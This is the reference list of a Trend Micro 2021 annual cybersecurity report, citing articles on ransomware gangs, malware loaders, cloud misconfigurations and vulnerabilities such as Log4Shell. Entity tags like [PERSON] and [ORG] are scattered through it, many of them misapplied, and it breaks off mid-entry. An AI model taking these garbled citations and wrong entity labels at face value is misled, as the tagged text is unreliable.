Conti . \u201d Accessed on [DATE] Jan. 25 , [DATE] 2022 , at url security / news / cybercrime - and - digital - threats / ransomware - double - extortion - and - beyond - revil - clop - and - conti.22 [PERSON] Pierre [PERSON] Cadieux , [PERSON] Colin [PERSON] Grady , [PERSON] Jaeson [PERSON] Schultz , and [PERSON] Matt [PERSON] Valites . ( [DATE] April [DATE] 30 , [DATE] 2019 ) . [PERSON] Cisco [PERSON] Talos . \u201c Sodinokibi ransomware exploitsWebLogic Server vulnerability . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , at url ransomware - exploits - weblogic.html.23 [PERSON] Michael [PERSON] Novinson . ( [DATE] April [DATE] 23 , [DATE] 2021 ) . CRN . \u201c [WORK_OF_ART] Apple [WORK_OF_ART] Menaced [WORK_OF_ART] After [WORK_OF_ART] REvil Ransomware Attack Against Supplier . \u201d Accessed onFeb . [DATE] 18 , [DATE] 2022 , at url [ORG] NPR . ( [DATE] June [DATE] 3 , [DATE] 2021 ) . [ORG] NPR . \u201c REvil , A Notorious [PERSON] Ransomware [PERSON] Gang , Was Behind JBS Cyberattack , The [ORG] FBI Says . \u201d [GPE] Accessedon [DATE] Feb. [DATE] 18 , [DATE] 2022 , at url cyberattack - the - fbi - says.25 [PERSON] Brian [PERSON] Fung . ( [DATE] July [DATE] 3 , [DATE] 2021 ) . [ORG] CNN . \u201c New ransomware attack targets key IT vendor . \u201d Accessed on [DATE] Feb. [DATE] 18 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : REvil . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : REvil . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , at url [PERSON] Alvin [PERSON] Nieto , [PERSON] Mark [PERSON] Vicente , RonJay Caragay , [PERSON] Miguel [PERSON] Carlo [PERSON] Ang , [PERSON] McJustine [PERSON] De [PERSON] Guzman , [PERSON] Emmanuel [PERSON] Evangelista , [PERSON] Divina [PERSON] Chua , and [PERSON] Marco [PERSON] Dela [PERSON] Vega . ( [DATE] March [DATE] 19 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Trend [ORG] Micro [ORG] Vision [ORG] One : Tracking Conti Ransomware . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : [PERSON] Conti . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Cyberattacks from all Angles : 2021 Midyear Report . \u201d Accessed on [DATE] Jan. [DATE] 28 , [CARDINAL] 2022,at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : [PERSON] Conti . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Cyber [WORK_OF_ART] Risk [WORK_OF_ART] Index ( [ORG] CRI ): [ORG] Trend [ORG] Micro and the [ORG] Ponemon [ORG] Institute investigatecybersecurity gaps . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , at url cyber - risk - index.html.33 [PERSON] Jon [PERSON] Clay . ( [DATE] Sept. [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [CARDINAL] 1H\u20192021 [ORG] Security [ORG] Review [ORG] Shows [ORG] Active [ORG] Cloud [ORG] Attacks . \u201d Accessed on [DATE] Feb. [DATE] 21 , [CARDINAL] 2022,at url [ORG] Trend [ORG] Micro . ( [DATE] March [DATE] 10 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Trend Micro Cloud App Security Report [DATE] 2019 . \u201d Accessed on [DATE] Feb. [DATE] 28 , [DATE] 2022 , aturl report-2019.35 [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Cyberattacks from all Angles : 2021 Midyear Report . \u201d Accessed on [DATE] Feb. [DATE] 21 , [CARDINAL] 2022,at url Business Wire . ( [DATE] Jan. [DATE] 13 , [DATE] 2022 ) . [PERSON] Business [PERSON] Wire . \u201c [WORK_OF_ART] The [WORK_OF_ART] Most [WORK_OF_ART] Common [WORK_OF_ART] Cloud [WORK_OF_ART] Misconfigurations [WORK_OF_ART] That [WORK_OF_ART] Could [WORK_OF_ART] Lead [WORK_OF_ART] to [WORK_OF_ART] SecurityBreaches . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url Infrastructure - Spending - Increased - in - Third [DATE] - [DATE] Quarter [DATE] - of-2021 - with - Overall - Growth - Expected - for-2021 - According - to - IDC.37 [ORG] Trend [ORG] Micro . ( [DATE] Oct. 25 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Most [WORK_OF_ART] Common [WORK_OF_ART] Cloud [WORK_OF_ART] Misconfigurations [WORK_OF_ART] That [WORK_OF_ART] Could [WORK_OF_ART] Lead [WORK_OF_ART] to [WORK_OF_ART] SecurityBreaches . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url most - common - cloud - misconfigurations - that - could - lead - to - security - breaches.37 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity Report38 Larry Dignan . ( [DATE] Dec. [DATE] 22 , [DATE] 2021 ) . ZDNet . \u201c Top cloud providers : AWS , [ORG] Microsoft [ORG] Azure , and Google Cloud , hybrid , SaaS players . \u201dAccessed on [DATE] March [DATE] 14 , [DATE] 2022 , at url google - cloud - hybrid - saas.39 [PERSON] Aaron [PERSON] Ansari . ( [DATE] Nov. [DATE] 30 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c What You Can Do to Mitigate Cloud Misconfigurations . \u201d Accessed on [DATE] Jan. [DATE] 30,2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Compromised Docker Hub Accounts Abused for Cryptomining Linked to TeamTNT.\u201dAccessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url abused - for - cryptomining - linked - t.html.41 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] Nov. [DATE] 11 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT [ORG] Upgrades [ORG] Arsenal , [PERSON] Refines [PERSON] Focus on [GPE] Kubernetesand GPU Environments . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url arsenal - refines - focus - on - kubernetes - and - gpu - env.html.42 [PERSON] Magno [PERSON] Logan and [PERSON] David [PERSON] Fiser . ( [DATE] May 25 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Targets Kubernetes , [CARDINAL] Nearly [CARDINAL] 50,000 IPs [PERSON] Compromisedin Worm [PERSON] - like Attack . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url kubernetes -- nearly-50 - 000 - ips - compromised.html.43 [PERSON] PurpleSec . ( n.d . ) . [PERSON] PurpleSec . \u201c [DATE] 2021 [ORG] Cyber [ORG] Security [ORG] Statistics . \u201d Accessed on [DATE] March [DATE] 1 , [DATE] 2022 , at url [GPE] Cisco . ( n.d . ) . [GPE] Cisco . \u201c [CARDINAL] 2021 [ORG] Cybersecurity threat trends : phishing , crypto top the list . \u201d Accessed on [DATE] March [DATE] 1 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. 7 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Malware [WORK_OF_ART] Awareness [WORK_OF_ART] - [WORK_OF_ART] EMOTET resurges with new detections . \u201d Accessed on Jan.30 , [DATE] 2022 , at url [PERSON] Erin [PERSON] Johnson . ( [DATE] March 2 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [LAW] Emotet [LAW] One [LAW] Month After the Takedown . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Attacks [WORK_OF_ART] Surge in [DATE] 1H [DATE] 2021 as [ORG] Trend [ORG] Micro [ORG] Blocks 41 Billion Cyber Threats . \u201dAccessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url Blocks-41 - Billion - Cyber - [PERSON] Threats.48 [PERSON] Ali [PERSON] Neil . ( [DATE] Nov. [DATE] 23 , [DATE] 2021 ) . [PERSON] Dark [PERSON] Reading . \u201c Do n\u2019t Help Cybercriminals Dash With Your Customers \u2019 Cash This Black [DATE] Friday . \u201dAccessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , at url your - customers - cash - this - black - friday.49 Business Wire . ( [DATE] Sept. [DATE] 9 , [DATE] 2021 ) . [PERSON] Business [PERSON] Wire . \u201c Information Technology Global Market Report [DATE] 2021 : IT Services ; [ORG] ComputerHardware ; [ORG] Telecom ; [ORG] Software [ORG] Products [ORG] - [ORG] Forecast [ORG] to [ORG] 2025 & 2030 - ResearchAndMarkets.com . \u201d Accessed on [DATE] March [DATE] 8 , [DATE] 2022 , at url [ORG] Services [ORG] - [ORG] Computer [ORG] - Hardware [ORG] - [ORG] Telecom [ORG] - [ORG] Software [ORG] - [ORG] Products --- [ORG] Forecast [ORG] - to-2025 [ORG] - 2030 [ORG] - --ResearchAndMarkets.com.50 [ORG] Sally [ORG] Adam . ( [DATE] Aug. 31 , [DATE] 2021 ) . Sophos . \u201c [WORK_OF_ART] The [WORK_OF_ART] State [WORK_OF_ART] of [WORK_OF_ART] Ransomware in Retail [DATE] 2021 . \u201d Accessed on [DATE] March 7 , [DATE] 2022 , at url [PERSON] Katie Kuehner [PERSON] - Hebert . ( [DATE] Dec. [DATE] 13 , [DATE] 2021 ) . [ORG] Constructor [ORG] Magazine . \u201c An increasing dependency on technology demands betterasset protection . \u201d Accessed on [DATE] March [DATE] 8 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] April [DATE] 10 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Historical [WORK_OF_ART] Overview [WORK_OF_ART] of [WORK_OF_ART] Proactive [WORK_OF_ART] Incident [WORK_OF_ART] Response [WORK_OF_ART] Strategies and What They Mean to Enterprises . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url digital - threats / historical - overview - of - proactive - incident - response - strategies - and - what - they - mean - to - enterprises.53 Trend Micro . ( [DATE] Nov. [DATE] 9 , [DATE] 2015 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Understanding [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks : [CARDINAL] Six Components of Targeted Attacks . \u201d [GPE] Accessedon [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Cyberattacks from all Angles : 2021 Midyear Report . \u201d Accessed on [DATE] Jan. [DATE] 28 , [CARDINAL] 2022,at url [ORG] Trend [ORG] Micro . ( [DATE] Oct. [DATE] 8 , [DATE] 2015 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Understanding [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks : [WORK_OF_ART] The [WORK_OF_ART] Impact [WORK_OF_ART] of [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks . \u201d Accessed onJan . 28 , 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Sept. 24 , [DATE] 2015 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Understanding [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks : What is [WORK_OF_ART] a [WORK_OF_ART] Targeted [WORK_OF_ART] Attack ? \u201d Accessed on Jan.28 , [DATE] 2022 , at url targeted - attack.38 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] Report57 [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 10 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Void [PERSON] Balaur and [PERSON] the [PERSON] Rise [PERSON] of [PERSON] the [PERSON] Cybermercenary [PERSON] Industry . \u201d Accessed on [DATE] Jan. [DATE] 29,2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 10 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c The far - reaching attacks of the [ORG] Void [ORG] Balaur cybermercenary group . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url of - the - void - balaur - cybermercenary - group.59 [PERSON] Nick [PERSON] Dai , [PERSON] Ted [PERSON] Lee , and [PERSON] Vickie [PERSON] Su . ( [DATE] Dec. [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Collecting [WORK_OF_ART] In [WORK_OF_ART] the [WORK_OF_ART] Dark : [WORK_OF_ART] Tropic [WORK_OF_ART] Trooper [WORK_OF_ART] Targets [WORK_OF_ART] Transportationand [WORK_OF_ART] Government . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url tropic - trooper - targets - transportation - and - government - organizations.html.60 [PERSON] Ian [PERSON] Kenefick . ( [DATE] Nov. [DATE] 23 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c BazarLoader Adds [PERSON] Compromised [PERSON] Installers , [ORG] ISO to [PERSON] Arrival and Delivery Vectors . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url iso - to - arrival - delivery - vectors.html.61 [PERSON] Raphael [PERSON] Centeno , Don [PERSON] Ovid [PERSON] Ladores , [PERSON] Lala [PERSON] Manly , [PERSON] Junestherry [PERSON] Salvador , and [PERSON] Frankylnn [PERSON] Uy . ( [DATE] April [DATE] 12 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [FAC] ASpike in [ORG] BazarCall and IcedID Activity Detected in [DATE] March . \u201d Accessed on Feb , [DATE] 18 , [DATE] 2022 , at url [ORG] en_us / research/21 / d / a - spike - in - bazarcall - and - icedid - activity.html.62 Homeland Security . ( [DATE] November [DATE] 2010 ) . [ORG] Homeland [ORG] Security . \u201c Sector Open Source Digest . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , aturl [PERSON] Ian [PERSON] Kenefick . ( [DATE] Nov. [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c QAKBOT Loader Returns With New Techniques and [ORG] Tools . \u201d Accessed on [DATE] Jan. [DATE] 29,2022 , at url [PERSON] Christopher [PERSON] Boyton . ( [DATE] Nov. [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] A [WORK_OF_ART] Review [WORK_OF_ART] and [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] 2021 Buer Loader Campaigns . \u201d Accessed on [GPE] Jan.29 , [DATE] 2022 , at url [PERSON] Aliakbar [PERSON] Zahravi and [PERSON] William [PERSON] Gamazo [PERSON] Sanchez . ( [DATE] Sept. [DATE] 20 , [DATE] 2021 ) . Fortinet . \u201c Water Basilisk Uses New HCrypt Variant to Flood Victims with [ORG] RAT [ORG] Payloads . \u201d Accessed on [DATE] Jan. 27 , [DATE] 2022 , at url Uses [ORG] - New [ORG] - [ORG] HCrypt [ORG] - Variant [ORG] - [ORG] to [ORG] - Flood [ORG] - Victims [ORG] - with [ORG] - [ORG] RAT [ORG] - Payloads.html.66 [ORG] Aliakbar [ORG] Zahravi and [PERSON] William [PERSON] Gamazo [PERSON] Sanchez . ( [DATE] Sept. [DATE] 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Water Basilisk Uses New HCrypt Variant to Flood Victims with [ORG] RAT [ORG] Payloads . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url [ORG] Basilisk [ORG] - Uses [ORG] - New [ORG] - [ORG] HCrypt [ORG] - Variant [ORG] - [ORG] to [ORG] - Flood [ORG] - Victims [ORG] - with [ORG] - [ORG] RAT [ORG] - Payloads.html.67 [ORG] Kaseya . ( [DATE] Feb. [DATE] 22 , [DATE] 2022 ) . [PERSON] Kaseya . \u201c [ORG] Patch [ORG] Management [ORG] Policy [ORG] Features , [NORP] Benefits and Best Practices . \u201d Accessed on [DATE] Feb. [DATE] 22,2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] April 7 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Nightmares [WORK_OF_ART] of [WORK_OF_ART] Patch [WORK_OF_ART] Management : [WORK_OF_ART] The [WORK_OF_ART] Status [WORK_OF_ART] Quo [WORK_OF_ART] and [WORK_OF_ART] Beyond . \u201d Accessed onFeb . [DATE] 21 , [DATE] 2022 , at url management - the - status - quo - and - beyond.69 [ORG] Trend [ORG] Micro . ( [DATE] July [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [CARDINAL] Nearly [CARDINAL] a [CARDINAL] Quarter [CARDINAL] of [CARDINAL] Exploits [CARDINAL] Sold [CARDINAL] on [CARDINAL] Cybercriminal [CARDINAL] Underground [CARDINAL] Are [CARDINAL] More [CARDINAL] ThanThree [CARDINAL] Years [CARDINAL] Old . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url Sold - on - Cybercriminal - Underground - Are - More - Than - Three - Years - Old.70 Trend Micro . ( [DATE] July [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Trends and shifts in the underground N [DATE] - [DATE] day exploit market . \u201d Accessed on [GPE] Jan.29 , [DATE] 2022 , at url underground - n - day - exploit - market.71 Microsoft Security Response Center . ( [DATE] Aug. [DATE] 13 , [DATE] 2019 ) . [ORG] Microsoft [ORG] Security [ORG] Response [ORG] Center . \u201c Remote Desktop Protocol ServerInformation Disclosure Vulnerability : CVE-2019 - 1225 . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url guide / en - us / vulnerability / CVE-2019 - [CARDINAL] 1225.72 [ORG] CVE report . ( [DATE] Sept. 2 , [DATE] 2017 ) . CVE.report . \u201c CVE-2017 - 14100 . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url [PERSON] Ranga [PERSON] Duraisamy , [PERSON] Ashish [PERSON] Verma , [PERSON] Miguel [PERSON] Carlo [PERSON] Ang , and [LOC] Nitesh [LOC] Surana . ( [DATE] Dec. [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Patch [WORK_OF_ART] Now : [ORG] Apache [ORG] Log4j [ORG] Vulnerability [ORG] Called [ORG] Log4Shell [ORG] Actively [ORG] Exploited . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , at url research/21 / l / patch - now - apache - log4j - vulnerability - called - log4shell - being - acti.html.74 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c The Log4j story , and how it has impacted our customers . \u201d Accessed on [DATE] Jan. [DATE] 29,2022 , at url | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [PERSON] Report75 [PERSON] Ranga [PERSON] Duraisamy , [PERSON] Ashish [PERSON] Verma , [PERSON] Miguel [PERSON] Carlo [PERSON] Ang , and [LOC] Nitesh [LOC] Surana . ( [DATE] Dec. [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Patch [WORK_OF_ART] Now : [ORG] Apache [ORG] Log4j [ORG] Vulnerability [ORG] Called [ORG] Log4Shell [ORG] Actively [ORG] Exploited . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url research/21 / l / patch - now - apache - log4j - vulnerability - called - log4shell - being - acti.html.76 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 22 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c The Log4j story , and how it has impacted our customers . \u201d Accessed on [DATE] Feb. [DATE] 21,2022 , at url [PERSON] Lisa [PERSON] Vaas . ( [DATE] Nov. [DATE] 22 , [DATE] 2021 ) . ThreatPost . \u201c Attackers Hijack Email Threads Using [ORG] ProxyLogon / [ORG] ProxyShell [ORG] Flaws . \u201d Accessed onFeb . [DATE] 21 , [DATE] 2022 , at url [LAW] Arianne [LAW] Dela [LAW] Cruz , Cris Tomboc , [PERSON] Jayson [PERSON] Chong , [PERSON] Nikki [PERSON] Madayag , and [PERSON] Sean [PERSON] Torre . ( [DATE] May [DATE] 6 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Proxylogon : A Coinminer , a [ORG] Ransomware , and a Botnet Join the Party . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , at url research/21 / e / proxylogon - a - coinminer -- a - ransomware -- and - a - botnet - join - the - part.html.79 [PERSON] Edmund [PERSON] Brumaghin , [PERSON] Mariano [PERSON] Graziano , and [PERSON] Nick [PERSON] Mavis . ( [DATE] Oct. 26 , [DATE] 2021 ) . [PERSON] Cisco [PERSON] Talos . \u201c [WORK_OF_ART] Squirrelwaffle [WORK_OF_ART] Leverages malspam to deliver [PERSON] Qakbot , Cobalt Strike . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2021 , at url emerges.html.80 [PERSON] Jon [PERSON] Clay . ( [DATE] Dec. [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [DATE] This [DATE] Week in Security News - December [DATE] 3 , [DATE] 2021 . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , aturl [PERSON] Mohamed [PERSON] Fahmy , [PERSON] Sherif [PERSON] Magdy and [PERSON] Abdelrhman [PERSON] Sharshar . ( [DATE] Nov. [DATE] 19 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Squirrelwaffle [WORK_OF_ART] Exploits [WORK_OF_ART] ProxyShell and [ORG] ProxyLogon to Hijack Email Chains . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [LOC] Squirrelwaffle [LOC] - [LOC] Exploits [LOC] - ProxyShell - and - ProxyLogon - to - Hijack - Email - Chains.html.82 [PERSON] Melanie [PERSON] Tafelski . ( [DATE] Nov. [DATE] 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Cybersecurity [WORK_OF_ART] Trends from [LOC] the [LOC] Global [LOC] Pandemic . \u201d Accessed on [DATE] Jan. [DATE] 28 , 2022,at url [PERSON] Atlas [PERSON] VPN . ( n.d . ) . [PERSON] Atlas [PERSON] VPN . \u201c Global VPN Adoption Index . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [PERSON] Fortinet . ( [DATE] Aug. [DATE] 28 , [DATE] 2019 ) . Fortinet . \u201c FortiOS and [ORG] SSL [ORG] Vulnerabilities . \u201d Accessed on [DATE] Jan. 27 , [DATE] 2022 , at url [ORG] National [ORG] Vulnerability [ORG] Database . ( [DATE] June [DATE] 4 , [DATE] 2019 ) . [ORG] National [ORG] Vulnerability [ORG] Database . \u201c CVE-2018 - 13379 Detail . \u201d Accessed on [GPE] Jan.27 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Jan. 26 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Examining A Sodinokibi Attack . \u201d Accessed on [DATE] Jan. 27 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : [PERSON] Conti . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 16 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Addressing [PERSON] Cloud [PERSON] - Related [PERSON] Threats to the IoT Addressing Cloud - Related Threats to the [NORP] IoT. \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url cloud - related - threats - to - the - iot.89 [ORG] Trend [ORG] Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c How to Reduce the Risk of Phishing and Ransomware : Osterman Research White Paper . \u201dAccessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url Zero Day Initiative . ( [DATE] Nov. [DATE] 1 , [DATE] 2021 ) . [DATE] Zero [DATE] Day [DATE] Initiative . \u201c Pwn2Own [PERSON] Austin [PERSON] 2021 [PERSON] - [PERSON] Schedule and Live Results . \u201d Accessed [DATE] onMarch [DATE] 1 , [DATE] 2022 , at url [PERSON] Eduard [PERSON] Kovacs . ( [DATE] Nov. [DATE] 5 , [DATE] 2021 ) . Security Week . \u201c [WORK_OF_ART] Device [WORK_OF_ART] Exploits [WORK_OF_ART] Earn [WORK_OF_ART] Hackers Over $ [MONEY] 1 [MONEY] Million at Pwn2Own Austin 2021.\u201dAccessed on [DATE] March [DATE] 1 , [DATE] 2022 , at url austin-2021.92 [PERSON] Jon [PERSON] Clay . ( [DATE] July [DATE] 21 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Reduce Instances of Covid-19 Phishing Email Attacks . \u201d Accessed on [DATE] Jan. [DATE] 30 , 2022,at url [PERSON] Paul [PERSON] Pajares . ( [DATE] July [DATE] 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Threats [WORK_OF_ART] Ride on the Covid-19 [PERSON] Vaccination [PERSON] Wave . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , aturl [ORG] US [ORG] Department [ORG] of [ORG] Health [ORG] and [ORG] Human [ORG] Services . ( [DATE] Feb. [DATE] 3 , [DATE] 2022 ) . [ORG] US [ORG] Department [ORG] of [ORG] Health [ORG] and [ORG] Human [ORG] Services . \u201c LessonsLearned from the HSE Cyber Attack . \u201d Accessed on [DATE] March 7 , [DATE] 2022 , at url hse - attack.pdf.40 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity Report95 IntSights . ( n.d . ) . [ORG] IntSights . \u201c [WORK_OF_ART] Building Immunity : [WORK_OF_ART] The [WORK_OF_ART] 2021 [ORG] Healthcare [ORG] and [ORG] Pharmaceutical [ORG] Industry [ORG] Cyber [ORG] Threat [ORG] LandscapeReport . \u201d Accessed on [DATE] March 7 , [DATE] 2022 , at url [ORG] Healthcare - Pharma%20Report-2021.pdf.96 [PERSON] Nic [PERSON] Newman . ( n.d . ) . [ORG] Reuters [ORG] Institute [ORG] for [ORG] the [ORG] Study [ORG] of [ORG] Journalism . \u201c [DATE] 2021 [EVENT] Digital [EVENT] News [EVENT] Report : Executive summary and keyfindings of the [DATE] 2021 report . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url dnr - executive - summary.97 Felix Richter . ( [DATE] Feb. [DATE] 4 , [DATE] 2021 ) . World Economic Forum . \u201c [PERSON] COVID-19 has caused a huge amount of lost working hours . \u201d [GPE] Accessedon [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url [ORG] International [ORG] Labour [ORG] Organization . ( [DATE] Oct. 27 , [DATE] 2021 ) . [ORG] International [ORG] Labour [ORG] Organization . \u201c ILO : Employment impact of thepandemic worse than expected . \u201d Accessed on [DATE] Feb. [DATE] 11 , [DATE] 2022 , at url WCMS_824098 / lang -- en / index.htm.99 World Economic Forum . ( [DATE] Jan. [DATE] 18 , [DATE] 2021 ) . World Economic Forum . \u201c Closing [WORK_OF_ART] the [WORK_OF_ART] Cyber Gap : [WORK_OF_ART] Business [WORK_OF_ART] and [WORK_OF_ART] Security [WORK_OF_ART] Leaders [WORK_OF_ART] at [WORK_OF_ART] Crossroads [WORK_OF_ART] as [WORK_OF_ART] Cybercrime [WORK_OF_ART] Spikes . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url cyber - gap - business - and - security - leaders - at - crossroads - as - cybercrime - spikes.100 [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 28 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] IoT and [ORG] Ransomware : A Recipe for Disruption . \u201d Accessed on [DATE] March [DATE] 1 , [DATE] 2022 , aturl [PERSON] Rajat [PERSON] Bhargava . ( [DATE] Feb. [DATE] 9 , [DATE] 2021 ) . [PERSON] Forbes . \u201c [WORK_OF_ART] Why [WORK_OF_ART] The \u2018 New Normal \u2019 [WORK_OF_ART] Requires [WORK_OF_ART] Zero [WORK_OF_ART] Trust . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( 